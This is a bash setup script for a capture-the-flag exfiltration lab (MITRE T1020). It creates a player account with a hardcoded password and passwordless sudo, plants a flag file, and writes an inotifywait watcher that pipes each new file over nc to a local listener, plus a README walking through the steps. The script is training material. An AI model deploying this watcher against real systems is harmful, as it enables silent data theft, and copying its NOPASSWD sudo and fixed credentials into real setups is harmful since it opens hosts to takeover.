#!/bin/bash
set -euo pipefail
PLAYER="player"; PASS="Player@123"
FLAG="HACKTIFY{AUTOMATED_EXFIL_$(hostname|sha256sum|cut -c1-8)}"
id "$PLAYER" &>/dev/null || { useradd -m -s /bin/bash "$PLAYER"; echo "$PLAYER:$PASS"|chpasswd; }
echo "$PLAYER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/player-auto; chmod 440 /etc/sudoers.d/player-auto
mkdir -p /opt/sensitive-data /opt/watch-dir
echo "$FLAG" > /opt/sensitive-data/flag.txt
echo "secret_key=AK47EXAMPLE12345" >> /opt/sensitive-data/flag.txt
chmod 644 /opt/sensitive-data/flag.txt /opt/watch-dir
# Create an automated exfil script using inotifywait
cat > /opt/auto_exfil.sh << 'AUTOEOF'
#!/bin/bash
# T1020 – Automated Exfiltration: watch directory and exfil new files
WATCH_DIR="/opt/watch-dir"
C2_HOST="localhost"
C2_PORT="5555"
echo "[*] Watching $WATCH_DIR for new files..."
inotifywait -m -e close_write --format '%w%f' "$WATCH_DIR" 2>/dev/null | while read file; do
    echo "[+] New file detected: $file"
    echo "[*] Exfiltrating to $C2_HOST:$C2_PORT..."
    echo "=== $file ===" | nc -q1 "$C2_HOST" "$C2_PORT" 2>/dev/null || true
    cat "$file"       | nc -q1 "$C2_HOST" "$C2_PORT" 2>/dev/null || true
    echo "[+] Exfil complete: $file"
done
AUTOEOF
chmod 755 /opt/auto_exfil.sh
cat > /home/$PLAYER/README.txt << 'RMEOF'
=== T1020 Automated Exfiltration ===
Login  : player / Player@123
Goal   : Set up automated exfiltration that triggers whenever a new file appears.
Step 1 : Start C2 receiver: nc -lvnp 5555
Step 2 : Start auto exfil watcher: bash /opt/auto_exfil.sh &
Step 3 : Drop a file in watched dir: cp /opt/sensitive-data/flag.txt /opt/watch-dir/
Step 4 : Watch the C2 receiver automatically receive the file
RMEOF
chown $PLAYER:$PLAYER /home/$PLAYER/README.txt
echo "[+] T1020 setup complete."
